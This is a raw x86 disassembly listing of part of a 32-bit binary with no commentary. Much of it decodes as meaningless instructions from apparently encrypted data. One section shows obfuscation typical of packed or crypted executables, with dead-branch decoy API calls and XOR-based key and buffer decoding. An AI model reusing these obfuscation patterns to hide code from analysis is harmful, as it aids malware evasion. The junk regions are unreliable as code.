  4107c0:	sbb    dh,bh
  4107c2:	xchg   esp,eax
  4107c3:	push   0x6e
  4107c5:	xchg   DWORD PTR [esi],ecx
  4107c7:	(bad)  
  4107c8:	loope  0x410847
  4107ca:	inc    eax
  4107cb:	push   ecx
  4107cc:	(bad)  
  4107cd:	out    dx,al
  4107ce:	cld    
  4107cf:	pusha  
  4107d0:	mov    dh,BYTE PTR [esp+ecx*1-0x1d54c01e]
  4107d7:	cmp    cl,BYTE PTR [eax+0x32]
  4107da:	sbb    eax,0x8de95b1b
  4107df:	mov    eax,ds:0xa2396bdb
  4107e4:	popa   
  4107e5:	stos   DWORD PTR es:[edi],eax
  4107e6:	push   ebp
  4107e7:	leave  
  4107e8:	and    BYTE PTR [ebx+0x6c960116],dh
  4107ee:	xchg   DWORD PTR [ebp+eax*8+0x84b8fc0],eax
  4107f5:	ins    BYTE PTR es:[edi],dx
  4107f6:	xor    DWORD PTR [edi+0x266e602a],ebp
  4107fc:	pop    edx
  4107fd:	pop    esi
  4107fe:	adc    esi,DWORD PTR [esi+0x599f4f92]
  410804:	mov    dl,0xcf
  410806:	loope  0x41084c
  410808:	jp     0x4107bb
  41080a:	push   edx
  41080b:	dec    eax
  41080c:	mov    ds:0x29802b0c,al
  410811:	inc    esi
  410812:	jae    0x4107c0
  410814:	pop    edi
  410815:	mov    DWORD PTR [ecx+0x7d808567],edx
  41081b:	jmp    0x8974:0xd9cbfc08
  410822:	test   BYTE PTR [esi+edi*2],cl
  410825:	mov    dl,0x33
  410827:	dec    edx
  410828:	and    DWORD PTR [ebx-0x6],esi
  41082b:	inc    esi
  41082c:	sub    edi,ebp
  41082e:	test   al,0x6f
  410830:	jmp    0x410830
  410832:	sub    al,0x5c
  410834:	jno    0x410844
  410836:	and    eax,DWORD PTR [edi-0x6077b86c]
  41083c:	add    ecx,edx
  41083e:	xchg   esi,eax
  41083f:	(bad)  
  410840:	in     eax,0xf9
  410842:	imul   edx,DWORD PTR [edi-0x46],0x6e
  410846:	outs   dx,BYTE PTR ds:[esi]
  410847:	xor    eax,0x7a80250e
  41084c:	adc    ecx,edx
  41084e:	pop    edx
  41084f:	sub    eax,0x49f2c9a1
  410854:	mov    edx,0xc9058fb5
  410859:	jmp    0x2250404a
  41085e:	mov    WORD PTR [edx-0x44],?
  410861:	sti    
  410862:	lock sub esi,DWORD PTR [esi-0x2a53a5a2]
  410869:	mov    cl,BYTE PTR [ebx+0x12942d09]
  41086f:	daa    
  410870:	sbb    al,BYTE PTR [eax+0x1ecf7c5c]
  410876:	sub    eax,0x59ba0602
  41087b:	dec    edi
  41087c:	(bad)  
  41087e:	leave  
  41087f:	fbstp  TBYTE PTR [ecx]
  410881:	sbb    BYTE PTR [ecx+0x47f04080],bl
  410887:	and    BYTE PTR [ecx],dl
  410889:	inc    esi
  41088a:	inc    eax
  41088b:	pop    es
  41088c:	jecxz  0x4108b6
  41088e:	mov    WORD PTR [edi-0x4b16e8c9],ss
  410894:	adc    DWORD PTR [eax],eax
  410896:	sbb    DWORD PTR [ecx+0x1],edx
  410899:	sub    edx,DWORD PTR [esi-0x1b]
  41089c:	out    dx,al
  41089d:	jmp    0x3aa8:0x164192c
  4108a4:	mov    dh,dl
  4108a6:	add    ecx,DWORD PTR [ecx-0x487611cd]
  4108ac:	rcl    BYTE PTR [eax],cl
  4108ae:	sbb    eax,0x7ebea5d9
  4108b3:	cli    
  4108b4:	mov    dl,0x8e
  4108b6:	mov    BYTE PTR [eax-0xda6062b],bh
  4108bc:	mov    esp,0x93d6821d
  4108c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c2:	mov    dh,0x62
  4108c4:	dec    esp
  4108c5:	mov    dl,0x8d
  4108c7:	sub    DWORD PTR [edi],edx
  4108c9:	dec    ecx
  4108ca:	nop
  4108cb:	or     esi,esp
  4108cd:	enter  0xfa31,0xf0
  4108d1:	pop    edx
  4108d2:	push   edx
  4108d3:	jecxz  0x4108da
  4108d5:	hlt    
  4108d6:	pop    ecx
  4108d7:	(bad)  
  4108d8:	jae    0x41089e
  4108da:	jb     0x410912
  4108dc:	xchg   ecx,eax
  4108dd:	repz xor al,0x74
  4108e0:	retf   
  4108e1:	dec    ebp
  4108e2:	sbb    eax,0xb0087a35
  4108e7:	dec    ebx
  4108e8:	pop    ebp
  4108e9:	mov    eax,ds:0xec21a89a
  4108ee:	shr    BYTE PTR [ebp+0x3713ed8a],cl
  4108f4:	mov    eax,0xbe48231a
  4108f9:	mov    ebp,ebp
  4108fb:	sbb    DWORD PTR ds:0x540aca6e,edi
  410901:	aas    
  410902:	push   ecx
  410903:	sub    al,0x65
  410905:	int    0x43
  410907:	pop    ecx
  410908:	mov    dh,0x5c
  41090a:	mov    bl,0x46
  41090c:	mov    DWORD PTR [esi-0x6e],edi
  41090f:	cmp    bh,BYTE PTR [edi]
  410911:	adc    edx,DWORD PTR [ecx+0x5a]
  410914:	in     eax,dx
  410915:	in     eax,dx
  410916:	stos   DWORD PTR es:[edi],eax
  410917:	mov    ah,0x4f
  410919:	(bad)  
  41091a:	sar    bl,cl
  41091c:	bound  esi,QWORD PTR [edx-0x7f]
  41091f:	repnz add bh,BYTE PTR [ebp-0xc]
  410923:	nop
  410924:	sahf   
  410925:	fcomp  QWORD PTR [esi]
  410927:	call   FWORD PTR [ecx]
  410929:	jl     0x410937
  41092b:	adc    al,0x12
  41092d:	add    cl,BYTE PTR [esp+esi*1+0x53]
  410931:	sub    DWORD PTR [edx+0x27c766fc],0x4895b5c1
  41093b:	ror    dl,1
  41093d:	int3   
  41093e:	je     0x4108df
  410940:	cli    
  410941:	pop    ebp
  410942:	mov    eax,ds:0x45cb2209
  410947:	cmp    bl,BYTE PTR ss:[edx]
  41094a:	data16 (bad) 
  41094c:	and    al,BYTE PTR [ecx-0x30]
  41094f:	add    eax,0xd7005fef
  410954:	xchg   DWORD PTR [edx],ebx
  410956:	mov    BYTE PTR [ebx+0x2ef78624],dl
  41095c:	add    BYTE PTR [edx+0x7c],bh
  41095f:	(bad)  
  410960:	leave  
  410961:	(bad)
  410964:	jl     0x410967
  410966:	or     ah,bl
  410968:	dec    ecx
  410969:	sub    BYTE PTR [edx-0x64],bl
  41096c:	repnz ins DWORD PTR es:[edi],dx
  41096e:	or     DWORD PTR es:[bp+0x6f],esp
  410973:	mov    esi,ebx
  410975:	hlt    
  410976:	add    al,0x6e
  410978:	inc    esi
  410979:	cmp    eax,0xc548f321
  41097e:	out    dx,eax
  41097f:	in     eax,0xdc
  410981:	push   edi
  410982:	add    DWORD PTR [esi+0x27adb4db],esp
  410988:	mov    ebx,0x68ca974
  41098d:	test   al,0xfd
  41098f:	pushf  
  410990:	mov    edi,0x4292b3e6
  410995:	inc    ebp
  410996:	mov    ebx,0x65cf7bcc
  41099b:	sbb    al,0x5
  41099d:	hlt    
  41099e:	jl     0x4109a3
  4109a0:	mov    dh,0xa7
  4109a2:	ror    BYTE PTR [edx+esi*2+0x19],1
  4109a6:	pop    ecx
  4109a7:	pop    esp
  4109a8:	inc    eax
  4109a9:	xor    DWORD PTR [esi-0x8bda09],0x56
  4109b0:	xchg   esp,eax
  4109b1:	test   al,0xd7
  4109b3:	jecxz  0x410997
  4109b5:	sahf   
  4109b6:	pop    ebp
  4109b8:	and    DWORD PTR [eax],edi
  4109ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109bb:	push   es
  4109bc:	dec    ebx
  4109bd:	repnz out dx,eax
  4109bf:	bound  ebx,QWORD PTR [esi-0x58]
  4109c2:	pop    es
  4109c3:	lods   al,BYTE PTR ds:[esi]
  4109c4:	fwait
  4109c5:	stos   DWORD PTR es:[edi],eax
  4109c6:	mov    ch,0x3e
  4109c8:	mov    cl,0x3
  4109ca:	inc    ecx
  4109cb:	push   ebx
  4109cc:	adc    al,0xf7
  4109ce:	arpl   WORD PTR [esi-0x166edbcc],di
  4109d4:	loope  0x410a30
  4109d6:	hlt    
  4109d7:	jno    0x410a3f
  4109d9:	cmp    ecx,edx
  4109db:	jne    0x40e62e
  4109e1:	mov    ecx,DWORD PTR ds:0x424435
  4109e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4109ed:	mov    DWORD PTR [ecx],eax
  4109ef:	jmp    0x410a15
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx+0x52cd629f],0xb0
  410fc4:	imul   ebp,DWORD PTR [esi],0xa7a7aae
  410fca:	pop    edi
  410fcb:	jp     0x411047
  410fcd:	imul   esi,DWORD PTR [ebx+0x473cef1a],0xffffffac
  410fd4:	add    BYTE PTR [edi+0x24],ah
  410fd7:	xor    ebx,edi
  410fd9:	xchg   esi,eax
  410fda:	pop    ebp
  410fdb:	mov    ebx,0x40d92648
  410fe0:	mov    bl,0xea
  410fe2:	imul   esp,DWORD PTR [ecx+0x2],0x7e
  410fe6:	frstor es:[edx]
  410fe9:	sar    BYTE PTR [edx],cl
  410feb:	jl     0x41104a
  410fed:	sbb    BYTE PTR [ebp-0xe],dl
  410ff0:	fnstsw WORD PTR [eax-0x621ecdaa]
  410ff6:	adc    eax,0xd356ff23
  410ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ffc:	in     eax,dx
  410ffd:	shl    edx,0x78
  411000:	scas   eax,DWORD PTR es:[edi]
  411001:	ins    DWORD PTR es:[edi],dx
  411002:	mov    dh,0x41
  411004:	daa    
  411005:	push   0xa5e64a6
  41100a:	adc    DWORD PTR [eax-0x8468587],ebx
  411010:	test   al,0x82
  411012:	(bad)  
  411013:	sbb    al,0x4b
  411015:	sahf   
  411016:	(bad)  
  411017:	sub    al,0x4
  411019:	adc    ebp,ecx
  41101b:	call   0x14be:0xf60aa3a0
  411022:	dec    esi
  411023:	xor    eax,edx
  411025:	scas   eax,DWORD PTR es:[edi]
  411026:	loopne 0x411083
  411028:	repnz das 
  41102a:	icebp  
  41102b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41102c:	push   ss
  41102d:	mov    esp,0x7ee25c95
  411032:	(bad)  
  411033:	dec    ecx
  411034:	sahf   
  411035:	dec    ebx
  411036:	(bad)  
  411037:	mov    dh,0xb3
  411039:	mov    bl,0xdb
  41103b:	jmp    0xac75e9da
  411040:	mov    ah,0xf5
  411042:	sub    eax,0x6b1c6027
  411047:	adc    DWORD PTR [esi-0x648a156f],esp
  41104d:	mov    eax,ds:0x40e1d5a6
  411052:	das    
  411053:	push   0x28dd1aaf
  411058:	add    al,0x4
  41105a:	stc    
  41105b:	scas   eax,DWORD PTR es:[edi]
  41105c:	mov    esi,0x3572b2fa
  411061:	dec    esp
  411062:	out    dx,al
  411063:	out    0x65,al
  411065:	mov    eax,0x76eb0f67
  41106a:	iret   
  41106b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41106c:	xchg   ebx,eax
  41106d:	ds or  ax,0x699f
  411072:	cli    
  411073:	and    bh,BYTE PTR [eax]
  411075:	aaa    
  411076:	add    eax,0x442c19ad
  41107b:	jo     0x4110e6
  41107d:	hlt    
  41107e:	inc    esi
  41107f:	cmp    al,0x44
  411081:	aaa    
  411082:	adc    esp,edx
  411084:	setle  BYTE PTR [ecx]
  411087:	jb     0x411105
  411089:	lods   eax,DWORD PTR ds:[esi]
  41108a:	out    dx,al
  41108b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41108c:	call   0x8d0:0x4b5e32e0
  411093:	cli    
  411094:	jb     0x4110b9
  411096:	cld    
  411097:	xchg   edi,eax
  411098:	aad    0x9f
  41109a:	jbe    0x4110f0
  41109c:	pop    edi
  41109d:	outs   dx,DWORD PTR ds:[esi]
  41109e:	rcr    BYTE PTR [edx+0x317dbea7],0x18
  4110a5:	add    eax,ecx
  4110a7:	bound  edi,QWORD PTR [edi+0x4]
  4110aa:	fistp  WORD PTR ds:0x169ac3a1
  4110b0:	push   0x4e
  4110b2:	std    
  4110b3:	pop    ds
  4110b4:	(bad)  [edx]
  4110b6:	sti    
  4110b7:	xor    eax,0xc18c561b
  4110bc:	and    ch,BYTE PTR [edx+0x45d5db97]
  4110c2:	imul   ecx,DWORD PTR [ebp+0x48],0xffffffd1
  4110c6:	in     eax,0xf5
  4110c8:	cwde   
  4110c9:	adc    eax,0x264d13f2
  4110ce:	shr    BYTE PTR [ecx+edx*2+0x5d],1
  4110d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110d3:	add    eax,0x36166de0
  4110d8:	mov    BYTE PTR [ecx-0x7dd54b00],bh
  4110de:	dec    BYTE PTR [esp+ecx*2]
  4110e1:	sub    al,0x54
  4110e3:	retf   
  4110e4:	aas    
  4110e5:	aaa    
  4110e6:	xchg   esi,eax
  4110e7:	test   BYTE PTR [esi-0x52],cl
  4110ea:	jmp    0x4110e0
  4110ec:	shl    DWORD PTR [esi-0x6e6f0147],1
  4110f2:	xchg   ecx,eax
  4110f3:	add    al,0x4
  4110f5:	scas   eax,DWORD PTR es:[edi]
  4110f6:	retf   0xc89c
  4110f9:	dec    BYTE PTR [eax]
  4110fb:	ret    0xdf3d
  4110fe:	mov    dl,0xfb
  411100:	hlt    
  411101:	mov    dh,cl
  411103:	gs je  0x411142
  411106:	xor    BYTE PTR [ebx+0x4c],dh
  411109:	jg     0x41116c
  41110b:	scas   al,BYTE PTR es:[edi]
  41110c:	jns    0x411114
  41110e:	pop    ss
  41110f:	dec    edi
  411110:	jl     0x41109c
  411112:	sub    al,0x61
  411114:	adc    edi,ebp
  411116:	pop    eax
  411117:	addr16 ret 
  411119:	cmp    esi,edi
  41111b:	(bad)  
  41111d:	sti    
  41111e:	div    edi
  411120:	jmp    0x40c5:0x2cbcac51
  411127:	push   edi
  411128:	xchg   DWORD PTR [eax],edx
  41112a:	adc    al,0x73
  41112c:	les    ecx,FWORD PTR [ebx+ebp*1-0x20]
  411130:	mov    esp,DWORD PTR [ecx-0x7b06aa6a]
  411136:	ins    BYTE PTR es:[edi],dx
  411137:	repz fyl2x 
  41113a:	add    bl,BYTE PTR [edx-0x8]
  41113d:	arpl   WORD PTR [esi],di
  41113f:	inc    edx
  411140:	sub    dl,BYTE PTR [ecx]
  411142:	xor    eax,0xaf3b6b5f
  411147:	rol    BYTE PTR [eax],cl
  411149:	adc    eax,0xc9c4776d
  41114e:	pshufw mm7,QWORD PTR [edx],0xc4
  411152:	dec    DWORD PTR [esi+0x60]
  411155:	aad    0x3c
  411157:	daa    
  411158:	xlat   BYTE PTR ds:[ebx]
  411159:	jecxz  0x41115c
  41115b:	add    DWORD PTR [esi+0x29fa7674],esp
  411161:	adc    al,0xdc
  411163:	aaa    
  411164:	mov    ch,0x6f
  411166:	jl     0x411176
  411168:	ins    BYTE PTR es:[edi],dx
  411169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116a:	pop    ecx
  41116b:	mov    edx,DWORD PTR [edx+0x46]
  41116e:	xor    al,0xb4
  411170:	sub    al,0x70
  411172:	jne    0x411111
